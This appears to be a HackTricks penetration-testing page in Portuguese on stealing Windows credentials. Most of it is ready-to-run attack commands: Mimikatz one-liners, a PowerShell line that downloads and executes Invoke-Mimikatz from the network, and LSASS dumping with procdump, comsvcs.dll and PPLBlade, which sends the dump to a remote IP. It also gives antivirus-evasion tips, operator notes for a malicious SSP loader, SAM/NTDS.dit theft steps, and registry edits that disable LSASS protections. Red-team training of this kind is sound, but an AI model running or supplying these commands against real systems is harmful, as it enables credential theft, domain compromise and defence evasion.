# Roubando Credenciais do Windows

{{#include ../../banners/hacktricks-training.md}}

## Credenciais Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Encontre outras funcionalidades que o Mimikatz pode executar em** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Saiba mais sobre algumas possíveis proteções para credentials aqui.**](credentials-protections.md) **Essas proteções podem impedir que Mimikatz extraia algumas credentials.**

## Credentials com Meterpreter

Use o [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **que** eu criei para **procurar passwords e hashes** na vítima.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Contornando AV

### Procdump + Mimikatz

Como **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**é uma ferramenta legítima da Microsoft**, não é detectado pelo Defender.\
Você pode usar esta ferramenta para **dump the lsass process**, **download the dump** e **extract** as **credentials locally** do dump.

Você também pode usar [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
This process is done automatically with [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Note**: Alguns **AV** podem **detectar** como **malicioso** o uso de **procdump.exe to dump lsass.exe**, isso acontece porque eles estão **detectando** a string **"procdump.exe" and "lsass.exe"**. Portanto é mais **stealthier** passar como **argumento** o **PID** de lsass.exe para o procdump **instead of** o **name lsass.exe.**

### Dumping lsass com **comsvcs.dll**

Uma DLL chamada **comsvcs.dll** encontrada em `C:\Windows\System32` é responsável por **dumping process memory** no caso de um crash. Essa DLL inclui uma **função** chamada **`MiniDumpW`**, projetada para ser invocada usando `rundll32.exe`.\
Não importa o uso dos dois primeiros argumentos, mas o terceiro é dividido em três componentes. O PID do processo a ser dumpado constitui o primeiro componente, o local do arquivo de dump representa o segundo, e o terceiro componente é estritamente a palavra **full**. Não existem opções alternativas.\
Ao analisar esses três componentes, a DLL cria o arquivo de dump e transfere a memória do processo especificado para esse arquivo.\
A utilização da **comsvcs.dll** é viável para dumping do processo lsass, eliminando assim a necessidade de enviar e executar procdump. Esse método é descrito em detalhe em [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

The following command is employed for execution:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Você pode automatizar esse processo com** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass com Task Manager**

1. Clique com o botão direito na Barra de Tarefas e clique em Task Manager
2. Clique em More details
3. Procure o processo "Local Security Authority Process" na aba Processes
4. Clique com o botão direito no processo "Local Security Authority Process" e clique em "Create dump file".

### Dumping lsass com procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) é um binário assinado pela Microsoft que faz parte da suíte [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Despejando lsass com PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) é uma Protected Process Dumper Tool que suporta ofuscar dumps de memória e transferi-los para estações de trabalho remotas sem gravá-los no disco.

**Funcionalidades principais**:

1. Contornar a proteção PPL
2. Ofuscar arquivos de dump de memória para evitar mecanismos de detecção baseados em assinaturas do Defender
3. Fazer o upload de dumps de memória usando métodos RAW e SMB sem gravá-los no disco (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon fornece um dumper de três estágios chamado **LalsDumper** que nunca chama `MiniDumpWriteDump`, portanto hooks de EDR nessa API nunca disparam:

1. **Stage 1 loader (`lals.exe`)** – procura em `fdp.dll` por um placeholder composto por 32 caracteres `d` minúsculos, sobrescreve-o com o caminho absoluto para `rtu.txt`, salva a DLL patchada como `nfdp.dll` e chama `AddSecurityPackageA("nfdp","fdp")`. Isso força o **LSASS** a carregar a DLL maliciosa como um novo Security Support Provider (SSP).
2. **Stage 2 inside LSASS** – quando o LSASS carrega `nfdp.dll`, a DLL lê `rtu.txt`, XORa cada byte com `0x20` e mapeia o blob decodificado na memória antes de transferir a execução.
3. **Stage 3 dumper** – o payload mapeado reimplementa a lógica do MiniDump usando **direct syscalls** resolvidos a partir de nomes de API hasheados (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Um export dedicado chamado `Tom` abre `%TEMP%\<pid>.ddt`, grava um dump comprimido do LSASS no arquivo e fecha o handle para que a exfiltração possa ocorrer depois.

Operator notes:

* Mantenha `lals.exe`, `fdp.dll`, `nfdp.dll` e `rtu.txt` no mesmo diretório. O Stage 1 reescreve o placeholder hard-coded com o caminho absoluto para `rtu.txt`, então separá-los quebra a cadeia.
* O registro acontece adicionando `nfdp` em `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Você pode pré-sementar esse valor para fazer o LSASS recarregar o SSP a cada boot.
* Arquivos `%TEMP%\*.ddt` são dumps comprimidos. Descomprima localmente e então alimente-os no Mimikatz/Volatility para extração de credenciais.
* Executar `lals.exe` requer direitos admin/SeTcb para que `AddSecurityPackageA` tenha sucesso; uma vez que a chamada retorna, o LSASS carrega silenciosamente o SSP malicioso e executa o Stage 2.
* Remover a DLL do disco não a expulsa do LSASS. Ou delete a entrada de registro e reinicie o LSASS (reboot) ou deixe-a para persistência de longo prazo.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump segredos do LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump o NTDS.dit do DC alvo
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump o histórico de senhas do NTDS.dit do target DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Exibir o atributo pwdLastSet para cada conta do NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Esses arquivos devem estar **localizados** em _C:\windows\system32\config\SAM_ e _C:\windows\system32\config\SYSTEM._ Mas **você não pode simplesmente copiá‑los de forma convencional** porque eles são protegidos.

### Do Registro

A maneira mais fácil de roubar esses arquivos é obter uma cópia do registro:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Faça o download** desses arquivos para sua máquina Kali e **extraia os hashes** usando:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Você pode copiar arquivos protegidos usando este serviço. É necessário ser Administrador.

#### Using vssadmin

O binário vssadmin está disponível apenas nas versões do Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Mas você pode fazer o mesmo a partir do **Powershell**. Este é um exemplo de **como copiar o SAM file** (a unidade utilizada é "C:" e o arquivo é salvo em C:\users\Public), mas você pode usar isto para copiar qualquer arquivo protegido:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Código do livro: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Finalmente, você também pode usar o [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) para fazer uma cópia do SAM, SYSTEM e ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Credenciais do Active Directory - NTDS.dit**

O **NTDS.dit** é conhecido como o coração do **Active Directory**, contendo dados cruciais sobre objetos de usuário, grupos e suas associações. É onde os **password hashes** dos usuários de domínio são armazenados. Este arquivo é um banco de dados **Extensible Storage Engine (ESE)** e reside em **_%SystemRoom%/NTDS/ntds.dit_**.

Dentro desse banco de dados, três tabelas principais são mantidas:

- **Data Table**: Esta tabela é responsável por armazenar detalhes sobre objetos como usuários e grupos.
- **Link Table**: Mantém o registro de relacionamentos, como associações de grupo.
- **SD Table**: Aqui são armazenados os **security descriptors** de cada objeto, garantindo a segurança e o controle de acesso dos objetos armazenados.

Mais informações sobre isto: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

O Windows usa _Ntdsa.dll_ para interagir com esse arquivo e ele é usado por _lsass.exe_. Então, **parte** do arquivo **NTDS.dit** pode estar localizada **dentro da memória do `lsass`** (você pode encontrar os dados acessados mais recentemente provavelmente por causa da melhora de desempenho ao usar um **cache**).

#### Decriptando os hashes dentro do NTDS.dit

O hash é cifrado 3 vezes:

1. Decriptar o Password Encryption Key (**PEK**) usando o **BOOTKEY** e **RC4**.
2. Decriptar o **hash** usando **PEK** e **RC4**.
3. Decriptar o **hash** usando **DES**.

O **PEK** tem o **mesmo valor** em **cada domain controller**, mas ele é **cifrado** dentro do arquivo **NTDS.dit** usando o **BOOTKEY** do arquivo **SYSTEM** do domain controller (é diferente entre domain controllers). É por isso que, para obter as credenciais do arquivo NTDS.dit, **você precisa dos arquivos NTDS.dit e SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copying NTDS.dit using Ntdsutil

Disponível desde o Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Você também pode usar o truque [**volume shadow copy**](#stealing-sam-and-system) para copiar o arquivo **ntds.dit**. Lembre-se de que você também precisará de uma cópia do arquivo **SYSTEM** (novamente, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) truque).

### **Extraindo hashes do NTDS.dit**

Depois de ter **obtido** os arquivos **NTDS.dit** e **SYSTEM**, você pode usar ferramentas como _secretsdump.py_ para **extrair os hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Você também pode **extraí-los automaticamente** usando um usuário domain admin válido:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Para **arquivos NTDS.dit grandes** recomenda-se extraí-los usando [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Finalmente, você também pode usar o **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ ou **mimikatz** `lsadump::lsa /inject`

### **Extraindo objetos de domínio do NTDS.dit para um banco de dados SQLite**

Os objetos NTDS podem ser extraídos para um banco de dados SQLite com [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Não apenas os secrets são extraídos, mas também os objetos inteiros e seus atributos para posterior extração de informações quando o arquivo NTDS.dit bruto já foi recuperado.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
O hive `SYSTEM` é opcional, mas permite a descriptografia de segredos (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Juntamente com outras informações, os seguintes dados são extraídos: contas de usuário e de máquina com seus hashes, UAC flags, timestamp do último logon e da alteração de password, descrição das contas, nomes, UPN, SPN, grupos e memberships recursivas, árvore de organizational units e membership, trusted domains com trusts type, direction e attributes...

## Lazagne

Faça o download do binary em [here](https://github.com/AlessandroZ/LaZagne/releases). Você pode usar esse binary para extrair credentials de vários softwares.
```
lazagne.exe all
```
## Outras ferramentas para extrair credenciais do SAM e do LSASS

### Windows credentials Editor (WCE)

Esta ferramenta pode ser usada para extrair credenciais da memória. Baixe-a em: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extrai credenciais do arquivo SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Extrair credenciais do arquivo SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Faça o download em:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) e apenas **execute-o** e as senhas serão extraídas.

## Mineração de sessões RDP inativas e enfraquecimento dos controles de segurança

Ink Dragon’s FinalDraft RAT includes a `DumpRDPHistory` tasker whose techniques are handy for any red-teamer:

### Coleta de telemetria no estilo DumpRDPHistory

* **Alvos RDP de saída** – analise cada hive de usuário em `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Cada subchave armazena o nome do servidor, `UsernameHint`, e o timestamp da última gravação. Você pode replicar a lógica do FinalDraft com PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Evidência RDP de entrada** – consulte o log `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` para Event IDs **21** (successful logon) e **25** (disconnect) para mapear quem administrou a máquina:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Uma vez que você saiba qual Domain Admin se conecta regularmente, faça o dump do LSASS (com LalsDumper/Mimikatz) enquanto a sessão deles ainda estiver **desconectada**. CredSSP + NTLM fallback deixa o verificador e os tokens no LSASS, que podem então ser reproduzidos via SMB/WinRM para obter o `NTDS.dit` ou preparar persistência em controladores de domínio.

### Rebaixamentos no registro visados pelo FinalDraft

O mesmo implant também mexe em várias chaves do registro para facilitar o roubo de credenciais:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Definir `DisableRestrictedAdmin=1` força a reutilização completa de credenciais/tickets durante RDP, permitindo pivôs no estilo pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` desativa a filtragem de tokens do UAC para que administradores locais recebam tokens sem restrições pela rede.
* `DSRMAdminLogonBehavior=2` permite que o administrador DSRM faça logon enquanto o DC está online, dando aos atacantes outra conta integrada de alto privilégio.
* `RunAsPPL=0` remove as proteções LSASS PPL, tornando o acesso à memória trivial para dumpers como LalsDumper.

## References

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
